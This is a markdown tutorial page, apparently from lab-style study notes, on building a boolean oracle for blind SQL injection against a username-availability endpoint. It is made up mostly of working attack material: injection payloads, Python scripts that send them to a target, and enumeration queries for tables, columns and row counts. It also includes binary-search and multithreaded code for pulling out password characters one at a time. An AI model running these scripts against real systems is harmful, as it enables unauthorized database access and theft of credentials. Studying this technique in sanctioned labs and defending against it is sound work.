# 🔮 Designing the Oracle

## Theory

An **oracle** is a function that:
1. Takes a SQL query
2. Returns **True** or **False** based on evaluation

### How It Works

Since we know `maria` exists (returns `taken`), we can test queries:

```sql
SELECT Username FROM Users WHERE Username = 'maria' AND q-- -'
```

| Query Result | Response | Meaning |
|--------------|----------|---------|
| `q` = True | `taken` | Query evaluated as TRUE |
| `q` = False | `available` | Query evaluated as FALSE |

---

## Testing the Oracle

### True Condition

**Payload**: `maria' AND 1=1-- -`

```sql
SELECT Username FROM Users WHERE Username = 'maria' AND 1=1-- -'
```

**Response**: `status: taken` ✅ (True)

### False Condition

**Payload**: `maria' AND 1=0-- -`

```sql
SELECT Username FROM Users WHERE Username = 'maria' AND 1=0-- -'
```

**Response**: `status: available` ✅ (False)

---

## Important Note

> ⚠️ **Must use an existing username** (like `maria`)
> 
> If using non-existent username, result is always `available` regardless of query truth value.

---

## Python Oracle Script

```python
#!/usr/bin/env python3
import requests
import json
from urllib.parse import quote_plus

# The user we are targeting (must exist!)
target = "maria"

def oracle(q):
    """
    Returns True if query q evaluates to true
    Returns False if query q evaluates to false
    """
    payload = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(
        f"http://<TARGET>/api/check-username.php?u={payload}"
    )
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Sanity check - verify oracle works
assert oracle("1=1")        # Should be True
assert not oracle("1=0")    # Should be False

print("[+] Oracle working correctly!")
```

---

## Using the Oracle

### Count Rows in Table

**Base Query**:
```sql
(SELECT COUNT(*) FROM users) > 0
```

### Enumeration Script

```python
#!/usr/bin/env python3
import requests
import json
from urllib.parse import quote_plus

target = "maria"

def oracle(query):
    payload = quote_plus(f"{target}' AND ({query})-- -")
    response = requests.get(f"http://<TARGET>/api/check-username.php?u={payload}")
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'

# Find exact row count
i = 0
while not oracle(f"(SELECT COUNT(*) FROM users) = {i}"):
    i += 1

print(f"[+] Number of rows: {i}")
```

### Output

```bash
$ python3 oracle.py
[+] Number of rows: 3
```

---

## Oracle Query Examples

### Counting

```sql
-- More than X rows?
(SELECT COUNT(*) FROM users) > 5

-- Exact count?
(SELECT COUNT(*) FROM users) = 3
```

### String Comparison

```sql
-- First char of username?
SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1) = 'a'

-- Username length?
LEN((SELECT username FROM users LIMIT 1)) = 5
```

### Existence Checks

```sql
-- Table exists?
(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES 
 WHERE TABLE_NAME = 'users') > 0

-- Column exists?
(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS 
 WHERE COLUMN_NAME = 'password') > 0
```

---

## Oracle Pattern

```python
def oracle(q):
    # 1. Build payload with query
    payload = f"{target}' AND ({q})-- -"
    
    # 2. URL encode
    payload = quote_plus(payload)
    
    # 3. Send request
    response = requests.get(f"{url}?param={payload}")
    
    # 4. Parse response
    data = json.loads(response.text)
    
    # 5. Return boolean based on indicator
    return data['status'] == 'taken'  # or check length, content, etc.
```

---

## Optimization Tips

### Binary Search for Numbers

Instead of linear search (0, 1, 2, 3...), use binary search:

```python
def find_count(table):
    low, high = 0, 1000
    
    while low < high:
        mid = (low + high) // 2
        if oracle(f"(SELECT COUNT(*) FROM {table}) > {mid}"):
            low = mid + 1
        else:
            high = mid
    
    return low
```

### Parallel Requests

```python
import concurrent.futures

def check_char(pos, char):
    q = f"SUBSTRING(password,{pos},1)='{char}'"
    return char if oracle(q) else None

# Check multiple characters in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(lambda c: check_char(1, c), 'abcdefghijklmnopqrstuvwxyz')
```

---

## Next Steps

- [Extracting Data](extracting-data.md) - Character-by-character extraction
- [Binary Search Optimization](binary-search.md) - Faster extraction

---

## Quick Reference

### Payload Template

```
<existing_user>' AND (<query>)-- -
```

### URL Encoding

```python
from urllib.parse import quote_plus
encoded = quote_plus(payload)
```

### Common Assertions

```python
# Verify oracle before extraction
assert oracle("1=1"), "Oracle should return True for 1=1"
assert not oracle("1=0"), "Oracle should return False for 1=0"
```

